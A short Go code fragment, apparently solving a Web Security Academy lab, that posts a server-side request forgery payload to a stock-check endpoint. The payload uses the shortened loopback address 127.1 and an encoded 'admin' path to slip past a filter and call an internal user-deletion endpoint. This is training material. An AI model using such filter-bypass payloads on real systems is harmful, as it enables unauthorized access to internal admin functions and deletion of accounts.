...
func solve() error {
	baseUrl := "https://0a5f000703e390e3c1ea08bb00940003.web-security-academy.net"
	...
	_, body, err := post(client, stockUrl, headers, []byte("stockApi=http%3A%2F%2F127.1%2F%2561dmin%2Fdelete%3Fusername%3Dcarlos"))
	if err != nil {
		return err
	}
